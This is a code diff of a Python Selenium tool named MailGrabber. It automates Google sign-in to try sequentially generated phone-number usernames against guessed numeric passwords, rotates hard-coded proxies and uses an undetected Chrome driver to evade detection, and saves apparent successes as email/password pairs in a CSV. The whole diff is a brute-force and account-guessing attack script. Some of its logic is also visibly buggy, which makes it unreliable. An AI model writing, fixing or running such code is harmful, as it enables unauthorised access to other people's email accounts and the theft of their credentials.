@@ -8,7 +8,7 @@ from datetime import date, datetime
 from selenium.webdriver.chrome.options import Options
 import undetected_chromedriver as uc
 import random
-from src.const import PASSWORD_URL, GMAIL_URL, NEXT_BUTTON
+from src.const import PASSWORD_URL, GMAIL_URL, NEXT_BUTTON, SIGNIN_URL, INBOX_URL, EMAIL_FIELD, PASSWORD_FIELD, DONT_HAVE_PHONE
 
 
 class MailGrabber(uc.Chrome):
@@ -34,7 +34,14 @@ class MailGrabber(uc.Chrome):
         return chrome_options
 
     def rotate_proxy(self):
-        proxies = ['http://168.196.236.235:50100', 'http://168.196.236.235:50101', 'http://2.33.4.5:2322']
+        proxies = [
+            'http://168.196.236.235:50100',
+            'http://168.196.236.235:50101',
+            'https://168.196.236.235:50105'
+            'http://2.56.119.93:5074',
+            'http://45.94.47.66:8110',
+            'http://2.56.119.93:5074'
+        ]
         self.proxy = random.choice(proxies)
         self.options = self.get_chrome_options()
         self.quit()  # close the current browser window
@@ -57,144 +64,61 @@ class MailGrabber(uc.Chrome):
     def solve_captcha(self):
         pass
 
-    def convert_to_dataframe(self, s_arr, f_arr):
+    @staticmethod
+    def convert_to_dataframe(s_arr, f_arr):
         data_frame = pd.DataFrame({
             "Email": s_arr,
             "Password": f_arr
         })
         data_frame.to_csv(f"{datetime.now}.csv", index=False)
 
-    # def start_grabbing(self, x_path, number, amount, length_of_password):
-    #     arr = []
-    #     pass_arr = []
-    #     success_email = []
-    #     password_url = PASSWORD_URL
-    #
-    #     gmail_url = GMAIL_URL
-    #     mail_match = False
-    #     password_match = False
-    #
-    #     wait = WebDriverWait(self, 20)
-    #
-    #     email = wait.until(EC.element_to_be_clickable((By.XPATH, x_path)))
-    #
-    #     submit_email = wait.until(EC.element_to_be_clickable((
-    #         By.XPATH, "//span[normalize-space()='Next']"
-    #     )))
-    #     email.click()
-    #     i = 1
-    #     k = 1
-    #     while i <= amount:
-    #         i += 1
-    #         number = int(number) + 1
-    #         number_str = "0{}".format(number)
-    #         arr.append(number_str)
-    #         pass_arr.append(str(number)[:length_of_password])
-    #     print("Numbers for bypassing Email => " + str(arr))
-    #     print("Chosen Passwords => " + str(pass_arr))
-    #     sleep(2)
-    #     # while k <= amount and len(arr) > 0:
-    #     #     k += 1
-    #     for j in arr:
-    #         email.send_keys(j)
-    #         arr.remove(j)
-    #         sleep(3)
-    #         submit_email.click()
-    #         email.clear()
-    #         sleep(3)
-    #         print("Tried : " + str(j))
-    #         if self.current_url == password_url:
-    #             print("One email worked")
-    #             success_email.append(j)
-    #             print("Success Email" + str(j))
-    #             # pass password from here
-    #             # while k <= amount:
-    #             #     k += 1
-    #             for z in pass_arr:
-    #                 password = wait.until(EC.element_to_be_clickable((
-    #                     By.XPATH, "//input[@name='Passwd']"
-    #                 )))
-    #                 password.click()
-    #                 password.send_keys(z)
-    #                 next_button = wait.until(EC.element_to_be_clickable((
-    #                     By.XPATH, NEXT_BUTTON
-    #                 )))
-    #                 next_button.click()
-    #                 if self.current_url == gmail_url:
-    #                     password_match = True
-    #                     print("Email Matched: " + str(j) + password + str(z))
-    #                     self.convert_to_dataframe(arr, pass_arr)
-    #             sleep(3)
-    #             break
-    #
-    #         # email.clear()
-    #         # break
-    #     print("Numbers logs = > ", arr)
-    #     print("Testing all the numbers....")
-    #     print("Tried => ", len(arr), "times")
-    #     self.quit()
-
-    def get_current_url(self):
-        print(self.current_url)
-
     def start_grabbing(self, x_path, number, amount, length_of_password):
-        arr = []
-        pass_arr = []
-        success_email = []
-        password_url = PASSWORD_URL
+        email_array = []
+        password_array = []
+        password_for_trying = []
+        wait = WebDriverWait(self, 30)
 
-        gmail_url = GMAIL_URL
-
-        wait = WebDriverWait(self, 20)
-        email = wait.until(EC.element_to_be_clickable((By.XPATH, x_path)))
-
-        submit_email = wait.until(EC.element_to_be_clickable((
-            By.XPATH, "//span[normalize-space()='Next']"
-        )))
-        email.click()
-        i = 1
-        k = 1
-        while i <= amount:
-            i += 1
+        for i in range(0, amount):
             number = int(number) + 1
             number_str = "0{}".format(number)
-            arr.append(number_str)
-            pass_arr.append(str(number)[:length_of_password])
-        print("Numbers for bypassing Email => " + str(arr))
-        print("Chosen Passwords => " + str(pass_arr))
-        sleep(2)
-        while k <= amount:
-            k += 1
-            for j in arr:
-                email.send_keys(j)
-                sleep(2)
-                submit_email.click()
-                print("Tried : " + str(j))
-                if self.current_url == password_url:
-                    print("One email worked")
-                    success_email.append(j)
-                    print("Success Email" + str(j))
-                    # pass password from here
-                for z in pass_arr:
-                    password = wait.until(EC.element_to_be_clickable((
-                        By.XPATH, "//input[@name='Passwd']"
-                    )))
-                    password.click()
-                    password.send_keys(z)
-                    next_button = wait.until(EC.element_to_be_clickable((
-                        By.XPATH, NEXT_BUTTON
-                    )))
-                    next_button.click()
-                    if self.current_url == gmail_url:
-                        print("Email Matched: " + str(j) + password + str(z))
-                        self.convert_to_dataframe(arr, pass_arr)
-                sleep(2)
-                # email.clear()
-                # break
-        print("Numbers logs = > ", arr)
-        print("Testing all the numbers....")
-        print("Tried => ", len(arr), "times")
-        self.quit()
+            email_array.append(number_str)
+            password_array.append(str(number_str)[:length_of_password])
+
+        print("Chosen Emails: " + " " + str(email_array))
+        for j in range(len(password_array)):
+            password_for_trying.append(int(password_array[j]) + j)
+        print("Chosen Passwords: " + " " + str(password_for_trying))
+
+        email_field = wait.until(EC.element_to_be_clickable((By.XPATH, x_path)))
+        next_button = wait.until(EC.element_to_be_clickable((
+            By.XPATH, NEXT_BUTTON
+        )))
+
+        while True:
+            for email in email_array:
+                email_field.click()
+                email_field.send_keys(email)
+                next_button.click()
+                email_array.remove(email)
+                email_field.clear()
+                sleep(3)
+                # >>>>>>>>>>
+                password_field = wait.until(EC.visibility_of_element_located((
+                    By.XPATH, PASSWORD_FIELD
+                )))
+                if PASSWORD_FIELD:
+                    for p in password_for_trying:
+                        password_field.click()
+                        password_field.send_keys(p)
+                        next_button.click()
+                        sleep(3)
+                        password_field.clear()
+                        if DONT_HAVE_PHONE:
+                            self.convert_to_dataframe(email, p)
+                            self.get(GMAIL_URL)
+                # <<<<<<<<<<<<<<<<<
+            self.quit()
+
 
 """
 for testing numbers
